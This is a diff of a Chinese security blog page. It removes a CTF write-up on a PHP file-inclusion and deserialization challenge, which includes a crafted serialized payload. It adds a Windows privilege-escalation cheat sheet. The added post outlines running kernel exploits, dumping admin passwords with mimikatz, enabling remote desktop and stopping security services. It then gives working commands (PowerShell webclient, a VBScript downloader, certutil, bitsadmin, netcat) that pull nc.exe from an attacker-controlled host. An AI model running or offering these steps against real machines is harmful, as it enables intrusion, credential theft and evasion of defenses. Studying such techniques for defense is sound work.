@@ -4,11 +4,14 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="文件包含结合反序列化漏洞write_up, 星晴">
-    <meta name="description" content="0x01 文件包含漏洞访问相应的网站：
-&amp;lt;html&gt;
-Missing parameter&amp;lt;br&gt;Missing parameters&amp;lt;!--Please test index.php?file=xxx.php --&gt;
-&amp;l">
+    <meta name="keywords" content="windows提权, 星晴">
+    <meta name="description" content="1. 漏洞收集 0day库
+exploit-db 
+0da’y
+https://securitytracker.com/
+https://www.rapid7.com/db/modules/
+https://cxsecurity.com/
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +19,7 @@ Missing parameter&amp;lt;br&gt;Missing parameters&amp;lt;!--Please test index.ph
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>文件包含结合反序列化漏洞write_up | 星晴</title>
+    <title>windows提权 | 星晴</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -260,13 +263,13 @@ Missing parameter&amp;lt;br&gt;Missing parameters&amp;lt;!--Please test index.ph
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        文件包含结合反序列化漏洞write_up
+                        windows提权
                     </div>
                 </div>
             </div>
@@ -375,13 +378,9 @@ Missing parameter&amp;lt;br&gt;Missing parameters&amp;lt;!--Please test index.ph
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/CTF/" target="_blank">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -392,7 +391,7 @@ Missing parameter&amp;lt;br&gt;Missing parameters&amp;lt;!--Please test index.ph
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-04-20
+                    2019-05-23
                 </div>
 
                 
@@ -408,125 +407,72 @@ Missing parameter&amp;lt;br&gt;Missing parameters&amp;lt;!--Please test index.ph
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="0x01-文件包含漏洞"><a href="#0x01-文件包含漏洞" class="headerlink" title="0x01 文件包含漏洞"></a>0x01 文件包含漏洞</h3><p>访问相应的网站：</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-Missing parameter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Missing parameters<span class="token comment" spellcheck="true">&lt;!--Please test index.php?file=xxx.php --></span>
-<span class="token comment" spellcheck="true">&lt;!--Please get the source of hint.php--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
-</code></pre>
-<p>发现需要参数file,猜测是文件包含漏洞，使用伪协议：</p>
-<pre class=" language-vim"><code class="language-vim">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>changame<span class="token operator">.</span>ichunqiu<span class="token operator">.</span><span class="token builtin">com</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span><span class="token keyword">file</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>filter<span class="token operator">/</span>convert<span class="token operator">.</span>base64<span class="token operator">-</span>encode<span class="token operator">/</span>resource<span class="token operator">=</span>index<span class="token operator">.</span>php
-</code></pre>
-<p>然后得到其base64编码的源码，然后解码如下代码：</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-<span class="token prolog">&lt;?php
-error_reporting(0); 
-$file = $_GET["file"]; 
-$payload = $_GET["payload"];
-if(!isset($file)){
-    echo 'Missing parameter'.'&lt;br>';
-}
-if(preg_match("/flag/",$file)){
-    die('hack attacked!!!');
-}
-@include($file);
-if(isset($payload)){  
-    $url = parse_url($_SERVER['REQUEST_URI']);
-    parse_str($url['query'],$query);
-    foreach($query as $value){
-        if (preg_match("/flag/",$value)) { 
-            die('stop hacking!');
-            exit();
-        }
-    }
-    $payload = unserialize($payload);
-}else{ 
-   echo "Missing parameters"; 
-} 
-?></span>
-<span class="token comment" spellcheck="true">&lt;!--Please test index.php?file=xxx.php --></span>
-<span class="token comment" spellcheck="true">&lt;!--Please get the source of hint.php--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
-</code></pre>
-<p>然后继续使用伪协议读取hint.php文件如下：</p>
-<p><a href="http://changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=hint.php" target="_blank" rel="noopener">http://changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=hint.php</a><br>解码base64如下：</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?php  
-class Handle{ 
-    private $handle;  
-    public function __wakeup(){
-        foreach(get_object_vars($this) as $k => $v) {
-            $this->$k = null;
+                <h3 id="1-漏洞收集-0day库"><a href="#1-漏洞收集-0day库" class="headerlink" title="1. 漏洞收集 0day库"></a>1. 漏洞收集 0day库</h3><ol>
+<li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">exploit-db </a></li>
+<li><a href="https://0day.today" target="_blank" rel="noopener">0da’y</a></li>
+<li><a href="https://securitytracker.com/" target="_blank" rel="noopener">https://securitytracker.com/</a></li>
+<li><a href="https://www.rapid7.com/db/modules/" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/</a></li>
+<li><a href="https://cxsecurity.com/" target="_blank" rel="noopener">https://cxsecurity.com/</a></li>
+</ol>
+<h3 id="2-cve-2018-8120、cve-2018-8897、cve-2018-8174"><a href="#2-cve-2018-8120、cve-2018-8897、cve-2018-8174" class="headerlink" title="2.  cve-2018-8120、cve-2018-8897、cve-2018-8174"></a>2.  cve-2018-8120、cve-2018-8897、cve-2018-8174</h3><ol>
+<li>使用exploit进行提权</li>
+<li>使用mimikatz抓管理员密码</li>
+<li>使用命令行开启远程桌面</li>
+<li>使用账号密码连接</li>
+</ol>
+<h3 id="3-停止安全软件相关服务"><a href="#3-停止安全软件相关服务" class="headerlink" title="3. 停止安全软件相关服务"></a>3. 停止安全软件相关服务</h3><h3 id="4-文件传输三十六计"><a href="#4-文件传输三十六计" class="headerlink" title="4. 文件传输三十六计"></a>4. 文件传输三十六计</h3><h4 id="4-1-windows文件传输"><a href="#4-1-windows文件传输" class="headerlink" title="4.1 windows文件传输"></a>4.1 windows文件传输</h4><ol>
+<li>使用powershell下载<ul>
+<li>首先在kali 的 /var/www/html放入你的exe文件比如说nc.exe</li>
+<li>powershell输入如下命令<br><code>`</code><br>$p=New-Object system.net.webclient.</li>
+</ul>
+</li>
+</ol>
+<p>$p.downloadfile(“<a href="http://192.168.178.200/nc.exe&quot;,&quot;nc.exe&quot;" target="_blank" rel="noopener">http://192.168.178.200/nc.exe&quot;,&quot;nc.exe&quot;</a>)</p>
+<pre><code>
+-  也可以将上述命令存储在ps1文件中执行，但是默认情况下是无法执行powershell脚本的，需要在管理员权限下修改配置
 
-        }
-        echo "Waking up\n";
-    }
-    public function __construct($handle) { 
-        $this->handle = $handle; 
-    } 
-    public function __destruct(){
-        $this->handle->getFlag();
-    }
-}
+</code></pre><p>powershell set-executionpolicy unrestricted</p>
+<pre><code>
 
-class Flag{
-    public $file;
-    public $token;
-    public $token_flag;
+2.  Visual Basic 文件下载
 
-    function __construct($file){
-        $this->file = $file;
-        $this->token_flag = $this->token = md5(rand(1,10000));
-    }
-
-    public function getFlag(){
-        $this->token_flag = md5(rand(1,10000));
-        if($this->token === $this->token_flag)
-        {
-            if(isset($this->file)){
-                echo @highlight_file($this->file,true); 
-            }  
-        }
-    }
-}
-
-?></span>
-</code></pre>
-<h3 id="0x02-反序列化漏洞"><a href="#0x02-反序列化漏洞" class="headerlink" title="0x02 反序列化漏洞"></a>0x02 反序列化漏洞</h3><p>分析hint.php代码，我们需要绕过对payload里面字符串的检测，即：</p>
-<pre class=" language-php5"><code class="language-php5">var_dump($_SERVER['REQUEST_URI']);
-    $url = parse_url($_SERVER['REQUEST_URI']);
-    var_dump($url);
-    parse_str($url['query'],$query);
-    var_dump($query);
-    foreach($query as $value){
-        var_dump($value);
-        if (preg_match("/flag/",$value)) { 
-            die('stop hacking!');
-            exit();
-        }
-    }
-</code></pre>
-<p>使用如下的url：[<a href="http://changame.ichunqiu.com////index.php?file=hint.php&amp;payload=],主要是通过host后面////，" target="_blank" rel="noopener">http://changame.ichunqiu.com////index.php?file=hint.php&amp;payload=],主要是通过host后面////，</a></p>
-<p>来使得上面的正则匹配绕过<code>preg_match(&quot;/flag/&quot;,$value)</code>，这里<code>$url = parse_url($_SERVER[&#39;REQUEST_URI&#39;]);</code>,后得到的$url是：<code>string &#39;////ichunqiu.php?file=demo.php&amp;payload=</code>，然后<code>parse_str($url[&#39;query&#39;],$query);</code>，就得到query为：<code>boolean false</code>,然后再经过 <code>foreach($query as $value)</code>,这时候value已经变成</p>
-<pre class=" language-php5"><code class="language-php5">array (size=0)
-  empty
-</code></pre>
-<p>这时候正则匹配已然绕过，payload我们是通过get方法在开始已经获得的。这个时候我们得构造我们的payload了。仔细审计hint.php中的两个类， <code>__wakeup()</code>这个魔术方法在<code>unserialize($payload);</code>的时候创建完对象Handle后就会调用，这个时候它会将类里面的属性置空：</p>
-<pre class=" language-php5"><code class="language-php5">foreach(get_object_vars($this) as $k => $v) {
-            $this->$k = null;
-
-        }
-</code></pre>
-<p>这个时候在这个类的生命周期结束的时候，执行析构函数的时候，就不会执行Flag对象的getFlag函数，那么这个如何绕过呢？</p>
-<p>我们可以将这个对象的属性个数变成2个，原理是被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。参考</p>
-<blockquote>
-<p><a href="http://blog.csdn.net/qq_19876131/article/details/52890854" target="_blank" rel="noopener">http://blog.csdn.net/qq_19876131/article/details/52890854</a></p>
-</blockquote>
-<p>绕过__wakeup后，在对象Handle析构后，会调用handle也就是Flag的一个实例化对象的getFlag方法，从而将flag.php源码通过<code>echo @highlight_file($this-&gt;file,true);</code>高亮显示，得到flag。（ps:flag.php是通过访问网址发现响应码为200说明其存在）<br>所以构造payload如下：</p>
-<pre class=" language-groovy"><code class="language-groovy">payload<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"Handle"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Handle%00handle"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Flag"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"token_flag"</span><span class="token punctuation">;</span>R<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
-</code></pre>
-<p>0:6指的是对象名长度是6，Handle:2是Handle类里面有两个属性（原本是1但是为了绕过魔术方法_wake_up改成2），然后s:14是说明Handle的特殊属性handle，因为是私有属性所以是前面有一个Handle，0:4是Flag对象，后面不赘余，主要解释下：<code>&quot;token&quot;;N;</code>指的是token为空，因为在构造函数里面是通过md5生成的，所以这边我们给它置空，<code>s:10:&quot;token_flag&quot;;R:4;</code>,这个是token_flag是一个Flag类的属性，且由于<code>$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</code>,这个赋值从右向左执行，那么token_flag它对应的是token属性的引用，所以是R，4是指的是token这个引用第一次出现在序列化对象的第几个，在这个<code>O:4:&quot;Flag&quot;:3:s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}</code>中，Flag是第一个，file是第二，flag.php是第三，所以token是第四个，那么R后面就跟着4.</p>
-<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>首先从文件包含漏洞，使用伪协议读取源码，然后解码base64得到php源码，接下来审计源码发现存在反序列化漏洞，然后绕过index.php中对路径中的参数对字符串flag的检测(防止直接通过文件包含得到源码)，然后再绕过_wakeup魔术方法，这个方法主要是在反序列化得到对象后执行，这个方法将会使得handle属性为空，从而使得在析构函数不能执行Flag实例的getflag方法，所以通过增加Handle的属性绕过。</p>
-
+``` vbscript
+Set args = Wscript.Arguments
+Url = &quot;http://192.168.178.200/nc.exe&quot;
+dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 &#39;
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot; C:\nc.exe&quot;, 2 &#39;
+end with
+</code></pre><p>cmd下执行  <code>cscript test.vbs</code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006d1Stply1g3bc96rnfaj318o0menow.jpg" alt></p>
+<p>由于是users组用户所以不能直接放在c盘权限不够</p>
+<ol start="3">
+<li>nc传输<br>发送方cmd下执行:</li>
+</ol>
+<p><code>nc.exe -L -p 8888 &lt;test.vbs</code></p>
+<p>接收方执行<br><code>nc.exe 192.168.1.105 8888 &gt;test.vbs</code></p>
+<ol start="4">
+<li><p>使用certutil<br><code>certutil -urlcache -split -f http://192.168.178.200/nc.exe nc.exe</code></p>
+</li>
+<li><p>使用bitsadmin</p>
+</li>
+</ol>
+<p><code>bitsadmin /transfer n http://domain/file c:\%homepath%\file</code></p>
+<ol start="6">
+<li>ftp</li>
+<li>Windows Share File Download</li>
+<li><p>tftp</p>
+</li>
+<li><p>ipc文件下载/上传/登陆</p>
+</li>
+</ol>
+<a id="more"></a> 
             </div>
             <hr>
 
@@ -673,7 +619,7 @@ class Flag{
                     </span>
                     <a href="http://yoursite.com" class="b-link-green">星晴</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/04/20/wen-jian-bao-han-jie-he-fan-xu-lie-hua-lou-dong-write-up/" class="b-link-green">文件包含结合反序列化漏洞write_up</a>
+                    <a href="/2019/05/23/windows-ti-quan/" class="b-link-green">windows提权</a>
                 </p>
             </div>
         </div>
@@ -699,23 +645,26 @@ class Flag{
                 <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2019/04/20/wen-jian-bao-han-jie-he-fan-xu-lie-hua-lou-dong-write-up/">
+                <a href="/2019/05/23/windows-ti-quan/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="文件包含结合反序列化漏洞write_up">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="windows提权">
                         
-                        <span class="card-title">文件包含结合反序列化漏洞write_up</span>
+                        <span class="card-title">windows提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">0x01 文件包含漏洞访问相应的网站：
-&lt;html>
-Missing parameter&lt;br>Missing parameters&lt;!--Please test index.php?file=xxx.php -->
-&l</div>
+                    <div class="summary">1. 漏洞收集 0day库
+exploit-db 
+0da’y
+https://securitytracker.com/
+https://www.rapid7.com/db/modules/
+https://cxsecurity.com/
+</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-23
                             </span>
                         <span class="publish-author">
                             
@@ -727,14 +676,6 @@ Missing parameter&lt;br>Missing parameters&lt;!--Please test index.php?file=xxx.
                 </div>
 
                 
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                </div>
-                
             </div>
         </div>
         
@@ -744,22 +685,24 @@ Missing parameter&lt;br>Missing parameters&lt;!--Please test index.php?file=xxx.
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/">
+                <a href="/2019/05/22/di-gui-han-shu/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="python 爬虫基本库的使用">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="递归函数">
                         
-                        <span class="card-title">python 爬虫基本库的使用</span>
+                        <span class="card-title">递归函数</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1.urllib库python3中将python2中的urllib和urllib2两个库统一起来，统一为urllib库，它分为四个模块。
-request:发送HTTP请求的模块。
-error:异常处理模块，如果出现请求异常，可以获得异常并且</div>
+                    <div class="summary">1. 使用递归函数实现sumdef mysum(mylist):
+    if len(mylist)==0:
+        return 0
+    else:
+        return mylist.pop()+mysum(myl</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-13
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-22
                             </span>
                         <span class="publish-author">
                             
@@ -772,8 +715,8 @@ error:异常处理模块，如果出现请求异常，可以获得异常并且</
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python爬虫/" target="_blank">
-                        <span class="chip bg-color">python爬虫</span>
+                    <a href="/tags/算法/" target="_blank">
+                        <span class="chip bg-color">算法 -</span>
                     </a>
                     
                 </div>
